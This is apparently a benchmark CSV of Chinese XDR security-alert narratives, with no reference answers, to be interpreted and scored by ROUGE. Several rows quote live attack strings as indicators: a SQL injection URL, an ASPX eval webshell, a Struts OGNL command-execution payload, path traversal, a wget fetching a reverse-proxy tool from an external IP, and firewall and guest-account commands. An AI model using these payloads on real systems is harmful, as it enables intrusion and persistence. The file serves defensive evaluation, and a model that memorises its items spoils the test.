id,task_name,q_type,question,choice,answer,metrics,prompt
48,安全事件解读,sc,"XDR平台检测到（MS17-010）Microsoft Windows SMB服务端信息泄露漏洞（CVE-2017-0147）等内网横向攻击，存在失陷风险，可能是病毒事件导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月18日17点36分18秒，NDR组件检测到失败攻击，10.10.10.12对10.10.10.76、10.10.10.20发起永恒之蓝漏洞探测。
2. 在2023年04月18日18点05分26秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76、10.10.10.20发起（MS17-010）Microsoft Windows SMB服务端信息泄露漏洞（CVE-2017-0147）利用攻击。
3. 从2023年04月18日18点05分33秒到2023年04月19日16点35分51秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76发起SMB服务器暴力破解攻击。
4. 在2023年04月29日01点34分55秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76、10.10.10.20发起（MS17-010）Microsoft Windows SMB服务端信息泄露漏洞（CVE-2017-0147）利用攻击。
5. 在2023年05月05日18点13分30秒，NDR组件检测到失败攻击，10.10.10.12对10.10.10.76、10.10.10.20发起永恒之蓝漏洞探测。
本次攻击事件涉及到内网主机10.10.10.12，以及内网资产10.10.10.76、10.10.10.20，使用的主要攻击方式为账号暴力破解、漏洞攻击、网络行为异常，攻击者利用漏洞CVE-2017-0147发起攻击入侵。",,,rouge,
49,安全事件解读,sc,"XDR平台检测到通过命令激活账户，存在失陷风险，危险等级为严重，该事件是由CWPP组件检测到的，攻击过程为：
在2023年04月28日09点19分07秒，EDR组件检测到192.168.15.13涉及可疑的挖矿行为、通过命令添加防火墙白名单、通过命令激活账户，相关的命令行为netsh advfirewall firewall add rule name=windows-update dir=in action=allow profile=any program=C:\Windows\Temp\svchost.exe、net user guest /active。
本次攻击事件涉及到内网主机192.168.15.13，使用的主要攻击方式为感染病毒，攻击过程中涉及文件的MD5为9972871b1c08455f8455f353d6fbf614。",,,rouge,
50,安全事件解读,sc,"XDR平台检测到bitcoinminer家族挖矿，存在失陷风险，可能是病毒事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月11日03点19分25秒，NDR组件检测到失败攻击，1.1.1.8对166.66.66.131、55.55.55.55发起bitcoinminer家族挖矿。
本次攻击事件涉及到内网主机1.1.1.8，以及内网资产166.66.66.131、55.55.55.55，使用的主要攻击方式为感染病毒，攻击过程中涉及域名w.3ei.xyz。",,,rouge,
51,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月19日17点09分14秒，NDR组件检测到尝试攻击，74.74.74.74对192.168.100.200发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机192.168.100.200，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP74.74.74.74，网址192.168.50.98:8080/MavenWeb/get.jsp。",,,rouge,
52,安全事件解读,sc,"XDR平台检测到（S2-045）Apache Struts2 远程代码执行漏洞（CVE-2017-5638）等内网横向攻击，存在失陷风险，可能是自动化攻击导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月09日03点09分24秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起和信创云桌面文件上传漏洞利用攻击。
2. 在2023年04月09日03点11分32秒，NDR组件检测到尝试攻击，192.168.100.100、128.125.161.167对192.168.100.200发起WebShell文件上传。
3. 在2023年04月10日03点11分00秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起（S2-045）Apache Struts2 远程代码执行漏洞（CVE-2017-5638）利用攻击。
4. 在2023年04月10日03点11分32秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起通用SQL注入攻击。
5. 在2023年04月10日03点11分35秒，NDR组件检测到成功攻击，192.168.100.100对192.168.100.200发起call_user_func函数代码注入攻击。
6. 在2023年04月10日03点13分26秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起和信创云桌面文件上传漏洞利用攻击。
7. 在2023年04月10日03点16分45秒，NDR组件检测到失败攻击，192.168.100.100对192.168.100.200发起目录遍历攻击。
8. 在2023年04月10日03点16分45秒，NDR组件检测到成功攻击，192.168.100.100对192.168.100.200发起netstat命令注入攻击。
9. 在2023年04月10日03点16分46秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起通用JAVA反序列化攻击。
10. 在2023年04月11日03点16分09秒，NDR组件检测到尝试攻击，192.168.100.100对192.168.100.200发起Apache Olingo 代码问题漏洞（CVE-2019-17554）利用攻击。
本次攻击事件涉及到内网主机192.168.100.200，以及内网资产192.168.100.100，使用的主要攻击方式为漏洞攻击、网站攻击，攻击者利用漏洞CVE-2017-5638、CVE-2019-17554发起攻击入侵，攻击过程中涉及外网IP128.125.161.167，网址10.100.13.19:8017/char.php?title=b' and (select ascii(substring(user,2,1)) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>96 and '1'='1、/upload/upload_file.php.php、www.test.com/、10.155.240.162/phpcms2008_gbk/phpcms/yp/web/index.php、10.100.13.19:8015/code_injection/zhongce.php、10.100.13.19:8017/index.php、10.100.12.6:8008/、10.100.12.1:8014/、10.100.13.68:80/json.php、10.100.13.21:80/php_xxe/doLogin.php、10.100.4.156/content.php?z=<%@ Page Language=""""Jscript"""" validateRequest=""""false"""" %><%Response.Write(eval(Request.Item[""""w""""],""""unsafe""""));%>、10.100.13.18:8006/body_close.php、www.test.com/phprocketaddin/?page=../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe。",,,rouge,
53,安全事件解读,sc,"XDR平台检测到访问lemonduck挖矿的通信域名的行为，存在失陷风险，危险等级为高危，该事件是由EDR组件检测到的，攻击过程为：
在2023年04月28日10点34分50秒，EDR组件检测到192.168.15.14涉及访问lemonduck挖矿的通信域名，相关的域名为lplp.ackng.com。
本次攻击事件涉及到内网主机192.168.15.14，使用的主要攻击方式为感染病毒，攻击过程中涉及域名lplp.ackng.com，文件的MD5为9972871b1c08455f8455f353d6fbf614。",,,rouge,
54,安全事件解读,sc,,,,rouge,
55,安全事件解读,sc,"XDR平台检测到网络钓鱼-发现远程下载潜在风险文件，存在失陷风险，危险等级为严重，该事件是由EDR、NDR组件联合检测到的，攻击过程为：
1. 在2023年04月21日10点18分40秒，EDR组件检测到0.0.0.0涉及通过可疑cmd命令执行文件、通过powershell下载exe文件，相关的命令行为C:\Windows\\SysWOW64\\rundll32.exe。
2. 在2023年04月21日10点18分40秒，NDR组件检测到尝试攻击，0.0.0.0对11.11.12.102发起远程下载潜在风险文件。
本次攻击事件涉及到内网主机0.0.0.0，以及内网资产10.67.200.200，使用的主要攻击方式为访问恶意文件、黑客工具，攻击过程中涉及外网IP11.11.12.102，网址cs.test.com:8787/cs_evil.hta。",,,rouge,
56,安全事件解读,sc,"XDR平台检测到访问malware僵尸网络的通信域名的异常行为，存在失陷风险，可能是病毒事件导致的，危险等级为严重，该事件是由EDR组件检测到的，攻击过程为：
1. 在2023年04月27日20点26分55秒，EDR组件检测到192.168.15.21涉及通过SMB或RDP进行探测、通过永恒之蓝漏洞对外进行攻击。
2. 在2023年04月27日20点31分02秒，EDR组件检测到192.168.15.21涉及木马病毒，相关的病毒为Trojan.Win32.ShadowBrokers.sata，病毒文件MD5为3e89c56056e5525bf4d9e52b28fbbca7，路径为c:\windows\networkdistribution\trfo-2.dll。
3. 在2023年04月27日21点00分37秒，EDR组件检测到192.168.15.21涉及通过SMB或RDP进行探测、访问lemonduck挖矿的通信域名。
4. 从2023年04月28日17点17分58秒到2023年05月04日08点59分35秒，EDR组件检测到192.168.15.21涉及通过SMB或RDP进行探测、访问malware僵尸网络的通信域名。
本次攻击事件涉及到内网主机192.168.15.21，以及内网资产192.168.15.13、192.168.15.14，使用的主要攻击方式为感染病毒、终端行为异常，攻击过程中涉及域名each.tenchier.com、v.beahh.com、gus.achtlemon.com、z.totonm.com、see.ornamen.tk，文件的MD5为43aac72a9602ef53c5769f04e1be7386、ee2d6e1d976a3a92fb1c2524278922ae、1f0669f13dc0545917e8397063f806db、9744f0000284c2807de0651c7e0d980a、d9b5b26f0423230e99768092f17919a3、770d0caa24d964ea7c04ff5daf290f08、a539d27f33ef16e52430d3d2e92e9d5c、3e89c56056e5525bf4d9e52b28fbbca7、8c80dd97c37525927c1e549cb59bcbf3、f01f09fe90d0f810c44dce4e94785227。",,,rouge,
57,安全事件解读,sc,"XDR平台检测到访问恶意通信域名的行为，存在失陷风险，危险等级为高危，该事件是由CWPP组件检测到的，攻击过程为：
从2023年04月28日09点18分46秒到2023年04月28日09点18分58秒，EDR组件检测到192.168.15.13涉及访问恶意通信域名，相关的域名为lplp.ackng.com、cake.pilutce.com。
本次攻击事件涉及到内网主机192.168.15.13，使用的主要攻击方式为终端行为异常，攻击过程中涉及域名lplp.ackng.com、cake.pilutce.com、fget-career.com。",,,rouge,
58,安全事件解读,sc,"XDR平台检测到访问lemonduck挖矿的通信域名的行为，存在失陷风险，危险等级为高危，该事件是由EDR组件检测到的，攻击过程为：
在2023年04月28日20点13分03秒，EDR组件检测到192.168.15.21涉及访问lemonduck挖矿的通信域名，相关的域名为v.beahh.com。
本次攻击事件涉及到内网主机192.168.15.21，使用的主要攻击方式为感染病毒，攻击过程中涉及域名v.beahh.com。",,,rouge,
59,安全事件解读,sc,"XDR平台检测到通过powershell执行混淆命令，存在失陷风险，危险等级为严重，该事件是由CWPP组件检测到的，攻击过程为：
1. 在2023年04月19日10点22分43秒，EDR组件检测到10.10.10.11涉及通过powershell执行混淆命令。
2. 从2023年04月19日10点22分50秒到2023年04月19日10点22分59秒，EDR组件检测到10.10.10.11涉及伪装系统文件、通过powershell执行混淆命令，相关的命令行为net user guest /active。
3. 在2023年04月19日10点23分02秒，EDR组件检测到10.10.10.11涉及通过命令添加防火墙白名单、伪装系统文件、通过powershell执行混淆命令。
本次攻击事件涉及到内网主机10.10.10.11，使用的主要攻击方式为感染病毒、终端行为异常，攻击过程中涉及域名lplp.ackng.com、cake.pilutce.com，文件的MD5为9972871b1c08455f8455f353d6fbf614、4296f3bbf10cd63e7c86dbf66cf41973。",,,rouge,
60,安全事件解读,sc,"XDR平台检测到访问wannamine挖矿的通信域名的行为，存在失陷风险，危险等级为高危，该事件是由EDR组件检测到的，攻击过程为：
在2023年04月28日10点34分36秒，EDR组件检测到192.168.15.14涉及访问wannamine挖矿的通信域名，相关的域名为cake.pilutce.com。
本次攻击事件涉及到内网主机192.168.15.14，使用的主要攻击方式为感染病毒，攻击过程中涉及域名cake.pilutce.com，文件的MD5为9972871b1c08455f8455f353d6fbf614。",,,rouge,
61,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，可能是自动化攻击导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日20点17分26秒，NDR组件检测到尝试攻击，12.12.71.71对1.1.71.71发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机1.1.71.71，以及内网资产12.12.71.71，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP12.12.71.71，网址www.gztenon.com/hello/1.html。",,,rouge,
62,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月13日20点14分53秒，NDR组件检测到尝试攻击，192.200.41.254对192.200.41.56发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机192.200.41.56，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP192.200.41.254，网址192.200.41.56:8080/。",,,rouge,
63,安全事件解读,sc,"XDR平台检测到FastJson com.alibaba.fastjson.JSONObject远程执行代码漏洞等内网横向攻击，存在失陷风险，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月07日03点10分18秒，NDR组件检测到尝试攻击，10.128.58.156对10.128.157.131发起FastJson org.apache.tomcat.dbcp.dbcp2.BasicDataSource远程执行代码漏洞利用攻击、FastJson org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup远程执行代码漏洞利用攻击、FastJson br.com.anteros.dbcp.AnterosDBCPConfig远程执行代码漏洞利用攻击、FastJson com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig远程执行代码漏洞利用攻击、FastJson com.sun.rowset.JdbcRowSetImpl远程执行代码漏洞利用攻击、FastJson org.apache.commons.dbcp.BasicDataSource远程执行代码漏洞利用攻击、FastJson org.apache.xbean.propertyeditor.JndiConverter远程执行代码漏洞利用攻击、FastJson org.apache.shiro.jndi.JndiObjectFactory远程执行代码漏洞利用攻击。
2. 在2023年04月09日03点10分05秒，NDR组件检测到尝试攻击，10.128.58.156对10.128.157.131发起FastJson java.lang.Class远程执行代码漏洞利用攻击、FastJson com.sun远程执行代码漏洞利用攻击、FastJson org.apache.ignite.cache.jta远程执行代码漏洞利用攻击。
3. 在2023年04月09日03点10分06秒，NDR组件检测到尝试攻击，10.128.58.156对10.128.157.131发起FastJson com.alibaba.fastjson.JSONObject远程执行代码漏洞利用攻击、FastJson org.apache.tomcat远程执行代码漏洞利用攻击。
4. 在2023年04月10日03点10分04秒，NDR组件检测到尝试攻击，10.128.58.156对10.128.157.131发起FastJson java.lang.Class远程执行代码漏洞利用攻击、FastJson br.com.anteros远程执行代码漏洞利用攻击、FastJson com.alibaba.fastjson.JSONObject远程执行代码漏洞利用攻击、FastJson org.apache.shiro.jndi远程执行代码漏洞利用攻击、FastJson com.ibatis远程执行代码漏洞利用攻击、FastJson org.apache.xbean远程执行代码漏洞利用攻击、FastJson org.apache.ignite.cache.jta远程执行代码漏洞利用攻击、FastJson org.apache.commons.dbcp远程执行代码漏洞利用攻击。
5. 在2023年04月11日03点10分05秒，NDR组件检测到尝试攻击，10.128.58.156对10.128.157.131发起FastJson com.sun远程执行代码漏洞利用攻击、FastJson org.apache.tomcat远程执行代码漏洞利用攻击。
本次攻击事件涉及到内网主机10.128.157.131，以及内网资产10.128.58.156，使用的主要攻击方式为漏洞攻击，攻击过程中涉及网址10.128.157.131/bz3.php。",,,rouge,
64,安全事件解读,sc,"XDR平台检测到Apache Struts XWork ParameterInterceptor类OGNL安全绕过漏洞（CVE-2018-11776、CVE-2011-3923），存在失陷风险，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月06日19点46分31秒，NDR组件检测到成功攻击，10.100.4.25对10.100.12.1发起Apache Struts XWork ParameterInterceptor类OGNL安全绕过漏洞（CVE-2018-11776、CVE-2011-3923）利用攻击。
2. 在2023年04月06日19点46分33秒，NDR组件检测到成功攻击，10.100.4.25对10.100.12.1发起AspX Webshell StreamReader表单内容。
3. 在2023年04月06日19点46分38秒，NDR组件检测到成功攻击，10.100.4.25对10.100.12.1发起Apache Struts OGNL注入漏洞利用攻击。
本次攻击事件涉及到内网主机10.100.12.1，以及内网资产10.100.4.25，使用的主要攻击方式为漏洞攻击、网站攻击，攻击者利用漏洞CVE-2011-3923、CVE-2018-11776发起攻击入侵，攻击过程中涉及网址10.100.12.1:8008/${#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action。",,,rouge,
65,安全事件解读,sc,"XDR平台检测到漏洞利用-命令执行与命令与控制-挖矿感染，存在失陷风险，危险等级为严重，该事件是由NDR、EDR组件联合检测到的，攻击过程为：
1. 在2023年04月21日10点18分40秒，EDR组件检测到0.0.0.0涉及通过powershell下载可疑文件、通过可疑进程创建网络连接。
2. 在2023年04月21日10点18分40秒，NDR组件检测到成功攻击，0.0.0.0对55.55.55.55发起感染minepool家族挖矿。
3. 在2023年04月21日10点18分40秒，NDR组件检测到成功攻击，11.11.12.101对0.0.0.0发起Apache Log4j2远程代码执行漏洞(CVE-2021-44228/CVE-2021-45046)利用攻击。
本次攻击事件涉及到内网主机0.0.0.0，使用的主要攻击方式为感染病毒、漏洞攻击，攻击者利用漏洞CVE-2021-45046、CVE-2021-44228发起攻击入侵，攻击过程中涉及外网IP11.11.12.101、8.8.8.8、185.199.108.133，网址0.0.0.0:8080/MavenWeb/get.jsp。",,,rouge,
66,安全事件解读,sc,"XDR平台检测到Shiro反序列化攻击，存在失陷风险，危险等级为严重，该事件是由EDR、NDR组件联合检测到的，攻击过程为：
1. 在2023年04月21日10点18分40秒，EDR组件检测到0.0.0.0涉及通过wget下载文件、通过工具frp建立反向代理，相关的命令行为wget http://200.223.1.202:8079/frpc.0.36.2 。
2. 在2023年04月21日10点18分40秒，NDR组件检测到成功攻击，200.223.1.202对0.0.0.0发起Shiro反序列化攻击。
本次攻击事件涉及到内网主机0.0.0.0，使用的主要攻击方式为黑客工具、漏洞攻击，攻击过程中涉及外网IP200.223.1.202，网址10.223.0.60:8481/shiro/login.jsp，文件的MD5为6b70b43e1ba8468976c399024f3adb43。",,,rouge,
67,安全事件解读,sc,"XDR平台检测到永恒之蓝漏洞探测等内网横向攻击，存在失陷风险，可能是病毒事件导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月17日17点06分08秒，NDR组件检测到失败攻击，10.10.10.12对10.10.10.76、10.10.10.20发起永恒之蓝漏洞探测。
2. 在2023年04月17日17点06分35秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76发起SMB服务器暴力破解攻击。
3. 在2023年04月17日17点20分06秒，NDR组件检测到失败攻击，10.10.10.12对10.10.10.76、10.10.10.20发起永恒之蓝漏洞探测。
4. 在2023年04月17日18点03分52秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76发起SMB服务器暴力破解攻击。
本次攻击事件涉及到内网主机10.10.10.12，以及内网资产10.10.10.76、10.10.10.20，使用的主要攻击方式为账号暴力破解、网络行为异常。",,,rouge,
68,安全事件解读,sc,"XDR平台检测到（MS17-010）Microsoft Windows SMB服务端信息泄露漏洞（CVE-2017-0147），存在失陷风险，可能是病毒事件导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
从2023年04月17日17点06分08秒到2023年04月17日18点03分42秒，NDR组件检测到尝试攻击，10.10.10.12对10.10.10.76、10.10.10.20发起（MS17-010）Microsoft Windows SMB服务端信息泄露漏洞（CVE-2017-0147）利用攻击。
本次攻击事件涉及到内网主机10.10.10.12，以及内网资产10.10.10.76、10.10.10.20，使用的主要攻击方式为漏洞攻击，攻击者利用漏洞CVE-2017-0147发起攻击入侵。",,,rouge,
69,安全事件解读,sc,"XDR平台检测到windows系统命令ipconfig执行并遭受攻击，存在失陷风险，可能是定向攻击事件导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月17日16点58分33秒，NDR组件检测到成功攻击，74.74.74.74对192.168.100.200发起Apache Log4j2远程代码执行漏洞（CVE-2021-45046、CVE-2021-44228）利用攻击、windows系统命令ipconfig执行。
2. 在2023年04月17日17点34分54秒，NDR组件检测到成功攻击，74.74.74.74对192.168.100.200发起Apache Log4j2远程代码执行漏洞（CVE-2021-45046、CVE-2021-44228）利用攻击、通用系统命令注入攻击。
本次攻击事件涉及到内网主机192.168.100.200，使用的主要攻击方式为漏洞攻击、网站攻击，攻击者利用漏洞CVE-2021-45046、CVE-2021-44228发起攻击入侵，攻击过程中涉及外网IP74.74.74.74，网址192.168.50.98:8080/MavenWeb/get.jsp。",,,rouge,
70,安全事件解读,sc,"XDR平台检测到bitcoinminer家族挖矿，存在失陷风险，可能是病毒事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月11日03点19分25秒，NDR组件检测到失败攻击，1.1.1.6对166.66.66.131、55.55.55.55发起bitcoinminer家族挖矿。
本次攻击事件涉及到内网主机1.1.1.6，使用的主要攻击方式为感染病毒，攻击过程中涉及域名w.3ei.xyz。",,,rouge,
71,安全事件解读,sc,"XDR平台检测到matrix家族勒索软件，存在失陷风险，可能是病毒事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年05月04日21点14分38秒，NDR组件检测到攻击主机已经失陷，192.168.16.8对114.114.114.114发起matrix家族勒索软件。
本次攻击事件涉及到内网主机192.168.16.8，使用的主要攻击方式为感染病毒，攻击过程中涉及域名prcp.mygoodsday.org。",,,rouge,
72,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，可能是自动化攻击导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日20点06分54秒，NDR组件检测到尝试攻击，12.12.157.157对1.1.157.157发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机1.1.157.157，以及内网资产12.12.157.157，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP12.12.157.157，网址www.gztenon.com/hello/1.html。",,,rouge,
73,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，可能是自动化攻击导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日20点17分26秒，NDR组件检测到尝试攻击，12.12.88.88对1.1.88.88发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机1.1.88.88，以及内网资产12.12.88.88，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP12.12.88.88，网址www.gztenon.com/hello/1.html。",,,rouge,
74,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，可能是自动化攻击导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日20点17分26秒，NDR组件检测到尝试攻击，12.12.85.85对1.1.85.85发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机1.1.85.85，以及内网资产12.12.85.85，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP12.12.85.85，网址www.gztenon.com/hello/1.html。",,,rouge,
75,安全事件解读,sc,"XDR平台检测到【冰蝎|哥斯拉】JSP（内存马）通信，存在失陷风险，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日16点01分10秒，NDR组件检测到成功攻击，192.168.159.133对192.168.159.11发起【冰蝎|哥斯拉】JSP（内存马）通信。
本次攻击事件涉及到内网主机192.168.159.11，以及内网资产192.168.159.133，使用的主要攻击方式为后门通信，攻击过程中涉及网址192.168.159.11/gsl_xor_base64.php。",,,rouge,
76,安全事件解读,sc,"XDR平台检测到wannacry家族勒索软件，存在失陷风险，可能是病毒事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月14日22点40分08秒，NDR组件检测到尝试攻击，202.0.1.223对192.168.254.20发起wannacry家族勒索软件。
本次攻击事件涉及到内网主机192.168.254.20，使用的主要攻击方式为感染病毒，攻击过程中涉及域名abcsangfor12.com.cn。",,,rouge,
77,安全事件解读,sc,"XDR平台检测到主机10.33.40.129感染恶意病毒并进行挖矿，存在失陷风险，可能是病毒事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月08日03点11分40秒，NDR组件检测到攻击主机已经失陷，10.33.40.129对174.128.249.106发起minepool家族挖矿。
2. 在2023年04月08日03点16分49秒，NDR组件检测到攻击主机已经失陷，10.33.40.129对174.128.249.106发起加密挖矿通信流量。
3. 在2023年04月12日03点11分40秒，NDR组件检测到攻击主机已经失陷，10.33.40.129对174.128.249.106发起minepool家族挖矿。
4. 在2023年04月12日03点16分56秒，NDR组件检测到攻击主机已经失陷，10.33.40.129对174.128.249.106发起加密挖矿通信流量。
本次攻击事件涉及到内网主机10.33.40.129，使用的主要攻击方式为感染病毒，攻击过程中涉及外网IP174.128.249.106。",,,rouge,
78,安全事件解读,sc,"XDR平台检测到Rsas工具Web漏洞扫描，存在失陷风险，可能是自动化攻击导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
从2023年04月08日03点16分47秒到2023年04月12日03点16分46秒，NDR组件检测到失败攻击，192.168.100.100对192.168.100.200发起Rsas工具Web漏洞扫描。
本次攻击事件涉及到内网主机192.168.100.100，以及内网资产192.168.100.200，使用的主要攻击方式为黑客工具，攻击过程中涉及网址www.test.com/phprocketaddin/?page=../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe。",,,rouge,
79,安全事件解读,sc,"XDR平台检测到CobaltStrike后门，存在失陷风险，可能是定向攻击事件导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月07日03点09分14秒，NDR组件检测到成功攻击，192.168.1.5对10.100.18.20发起代理工具NPS通信。
2. 从2023年04月08日03点16分18秒到2023年04月12日03点16分22秒，NDR组件检测到攻击主机已经失陷，192.168.1.5对10.100.18.20发起CobaltStrike后门。
本次攻击事件涉及到内网主机192.168.1.5，以及内网资产10.100.18.20，使用的主要攻击方式为黑客工具，攻击过程中涉及网址26788.server.dnssec.sangforsec.com:443/dpixel。",,,rouge,
80,安全事件解读,sc,"XDR平台检测到WordPress插件高级自定义字段acf_abspath远程文件包含漏洞等内网横向攻击，存在失陷风险，可能是自动化攻击导致的，危险等级为严重，该事件是由NDR组件检测到的，攻击过程为：
1. 在2023年04月08日03点13分26秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress插件高级自定义字段acf_abspath远程文件包含漏洞利用攻击。
2. 在2023年04月08日03点13分28秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress插件Google Document Embedder任意文件读取漏洞（CVE-2012-4915）利用攻击。
3. 在2023年04月08日03点13分29秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress的插件Foxypress中文件uploadify.php存在任意PHP代码执行漏洞利用攻击。
4. 在2023年04月12日03点13分27秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress插件高级自定义字段acf_abspath远程文件包含漏洞利用攻击。
5. 在2023年04月12日03点13分28秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress插件Google Document Embedder任意文件读取漏洞（CVE-2012-4915）利用攻击。
6. 在2023年04月12日03点13分29秒，NDR组件检测到失败攻击，192.200.42.221对192.200.42.101发起WordPress的插件Foxypress中文件uploadify.php存在任意PHP代码执行漏洞利用攻击。
本次攻击事件涉及到内网主机192.200.42.101，以及内网资产192.200.42.221，使用的主要攻击方式为漏洞攻击，攻击者利用漏洞CVE-2012-4915发起攻击入侵，攻击过程中涉及外网IP192.200.42.221，网址192.200.42.101/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=l69j.pdf&file=../../../wp-config.php、192.200.42.101/wp-content/plugins/advanced-custom-fields/core/actions/export.php、192.200.42.101/wp-content/plugins/foxypress/uploadify/uploadify.php。",,,rouge,
81,安全事件解读,sc,"XDR平台检测到plugx家族木马远控，存在失陷风险，可能是病毒事件导致的，危险等级为中危，该事件是由NDR组件检测到的，攻击过程为：
在2023年05月04日21点14分27秒，NDR组件检测到攻击主机已经失陷，192.168.56.15对8.8.8.8发起plugx家族木马远控。
本次攻击事件涉及到内网主机192.168.56.15，使用的主要攻击方式为感染病毒，攻击过程中涉及域名news.voanews.hk。",,,rouge,
82,安全事件解读,sc,"XDR平台检测到基于GPT引擎检测的攻击行为，存在失陷风险，可能是自动化攻击导致的，危险等级为高危，该事件是由NDR组件检测到的，攻击过程为：
在2023年04月17日20点17分26秒，NDR组件检测到尝试攻击，12.12.99.99对1.1.99.99发起基于GPT引擎检测的攻击行为。
本次攻击事件涉及到内网主机1.1.99.99，以及内网资产12.12.99.99，使用的主要攻击方式为流量异常，攻击过程中涉及外网IP12.12.99.99，网址www.gztenon.com/hello/1.html。",,,rouge,
